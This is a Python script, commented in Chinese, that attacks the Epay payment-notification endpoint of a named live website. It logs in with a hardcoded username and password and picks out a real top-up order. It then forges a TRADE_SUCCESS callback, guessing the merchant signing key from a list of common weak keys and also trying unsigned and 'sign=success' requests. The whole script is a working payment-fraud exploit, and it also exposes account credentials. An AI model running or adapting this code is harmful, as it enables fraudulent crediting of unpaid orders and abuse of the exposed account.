#!/usr/bin/env python3
import requests
import json
import hashlib
import time

BASE_URL = "https://timyai.com"
TEST_USERNAME = "antplayer"
TEST_PASSWORD = "sjh@101709"
REAL_TRADE_NO = "USR20NO5FFXID1777806504"

def print_header(title):
    print(f"\n{'='*60}")
    print(f"{title}")
    print('='*60)

def test_login():
    print_header("1. 登录获取认证")
    
    data = {"username": TEST_USERNAME, "password": TEST_PASSWORD}
    
    try:
        url = BASE_URL + "/api/user/login"
        resp = requests.post(url, json=data, timeout=10)
        result = resp.json()
        
        if result.get("success"):
            user_id = result.get("data", {}).get("id")
            session = resp.cookies.get("session")
            print(f"✅ 登录成功 - 用户ID: {user_id}")
            return user_id, session
        else:
            print(f"❌ 登录失败: {result.get('message')}")
            return None, None
    except Exception as e:
        print(f"❌ 请求失败: {e}")
        return None, None

def get_order_info(user_id, session):
    print_header("2. 获取订单信息")
    
    cookies = {"session": session}
    headers = {"New-Api-User": str(user_id), "Content-Type": "application/json"}
    
    try:
        url = BASE_URL + "/api/user/topup/self"
        resp = requests.get(url, cookies=cookies, headers=headers, timeout=10)
        result = resp.json()
        
        if result.get("success"):
            items = result.get("data", {}).get("items", [])
            
            target_order = None
            for item in items:
                if item.get('trade_no') == REAL_TRADE_NO:
                    target_order = item
                    break
            
            if target_order:
                print(f"✅ 找到目标订单:")
                print(f"  订单号: {target_order.get('trade_no')}")
                print(f"  金额: {target_order.get('money')}元")
                print(f"  支付方式: {target_order.get('payment_method')}")
                print(f"  状态: {target_order.get('status')}")
                
                # 构建回调参数
                callback_params = {
                    "pid": "1378",
                    "out_trade_no": target_order.get('trade_no'),
                    "trade_status": "TRADE_SUCCESS",
                    "trade_fee": str(target_order.get('money')),
                    "type": target_order.get('payment_method'),
                }
                
                if 'trade_no' in target_order:
                    callback_params['trade_no'] = str(target_order['trade_no'])
                
                return callback_params, target_order
            else:
                print(f"❌ 未找到订单: {REAL_TRADE_NO}")
                return None, None
        else:
            print(f"❌ 获取失败: {result.get('message')}")
            return None, None
    except Exception as e:
        print(f"❌ 请求异常: {e}")
        return None, None

# 根据SDK代码实现的签名算法
def params_filter(params):
    """过滤参数，删除sign、sign_type和空值"""
    return {k: v for k, v in params.items() if not (k == "sign" or k == "sign_type" or v == "")}

def generate_sign(params, key):
    """
    根据SDK代码的签名算法生成MD5签名
    
    实现步骤:
    1. 过滤参数 (删除 sign, sign_type 和空值)
    2. 对key进行排序
    3. 生成 key=value&key=value 格式
    4. 拼接 key (密钥) 在最后
    5. MD5加密，得到小写hex格式
    """
    filtered = params_filter(params)
    sorted_keys = sorted(filtered.keys())
    url_string = '&'.join([f"{k}={filtered[k]}" for k in sorted_keys])
    sign_source = url_string + key
    sign = hashlib.md5(sign_source.encode()).hexdigest()
    
    print(f"\n🔑 签名算法分析:")
    print(f"  过滤后的参数: {sorted_keys}")
    print(f"  签名源字符串: {sign_source}")
    print(f"  生成的签名: {sign}")
    
    return sign

def test_signatures(params):
    print_header("3. 测试不同签名策略")
    
    url = BASE_URL + "/api/user/epay/notify"
    
    # 策略1: 常见密钥测试
    common_keys = [
        "test", "123456", "password", "key", 
        "secret", "admin", "epay", "zhunfu",
        "1378", "timyai", ""
    ]
    
    for key in common_keys:
        test_params = params.copy()
        test_params["sign"] = generate_sign(test_params, key)
        
        try:
            resp = requests.post(url, data=test_params, timeout=10)
            
            if resp.text == "success":
                print(f"\n✅✅✅ 找到有效密钥: '{key}'")
                print(f"    签名: {test_params['sign']}")
                return True, key, test_params
            else:
                print(f"  密钥 '{key}': {resp.text}")
        except Exception as e:
            print(f"  密钥 '{key}': 请求异常 {e}")
    
    # 策略2: 尝试无签名
    print(f"\n测试无签名...")
    try:
        resp = requests.post(url, data=params, timeout=10)
        print(f"  结果: {resp.text}")
        if resp.text == "success":
            print(f"⚠️  无签名也能通过！")
            return True, None, params
    except Exception as e:
        print(f"  异常: {e}")
    
    # 策略3: 尝试sign=success
    print(f"\n测试sign=success...")
    try:
        params_with_sign = params.copy()
        params_with_sign["sign"] = "success"
        resp = requests.post(url, data=params_with_sign, timeout=10)
        print(f"  结果: {resp.text}")
        if resp.text == "success":
            print(f"⚠️  sign=success也能通过！")
            return True, None, params_with_sign
    except Exception as e:
        print(f"  异常: {e}")
    
    return False, None, None

def verify_order_status(user_id, session, trade_no):
    print_header("4. 验证订单状态")
    
    cookies = {"session": session}
    headers = {"New-Api-User": str(user_id), "Content-Type": "application/json"}
    
    try:
        url = BASE_URL + "/api/user/topup/self"
        resp = requests.get(url, cookies=cookies, headers=headers, timeout=10)
        result = resp.json()
        
        if result.get("success"):
            items = result.get("data", {}).get("items", [])
            
            for item in items:
                if item.get('trade_no') == trade_no:
                    print(f"\n订单状态:")
                    print(f"  订单号: {item.get('trade_no')}")
                    print(f"  金额: {item.get('money')}元")
                    print(f"  状态: {item.get('status')}")
                    return item.get('status')
        
        return None
    except Exception as e:
        print(f"❌ 请求异常: {e}")
        return None

def main():
    print_header("timyai.com Epay SDK签名算法测试")
    
    print("""
📚 SDK签名算法 (来自 github.com/Calcium-Ion/go-epay):

1. ParamsFilter: 删除 sign, sign_type 和空值参数
2. ParamsSort: 对key进行字母排序
3. CreateUrlString: 生成 key=value&key=value 格式
4. MD5String: url_string + key 拼接后MD5
5. 比较签名是否一致
""")
    
    user_id, session = test_login()
    
    if not user_id:
        print("\n❌ 登录失败")
        return
    
    result = get_order_info(user_id, session)
    if not result:
        print("\n❌ 获取订单失败")
        return
    
    params, order = result
    
    # 添加时间参数，增强真实性
    params['time'] = str(int(time.time()))
    
    success, found_key, signed_params = test_signatures(params)
    
    if success:
        print(f"\n🎉🎉🎉 测试成功！🎉🎉🎉")
        if found_key:
            print(f"密钥: '{found_key}'")
        
        verify_order_status(user_id, session, REAL_TRADE_NO)
    else:
        print(f"\n✅ 没有找到可利用的漏洞")
        print(f"   签名验证机制正常工作")
        
        verify_order_status(user_id, session, REAL_TRADE_NO)
    
    print_header("测试完成")

if __name__ == "__main__":
    main()
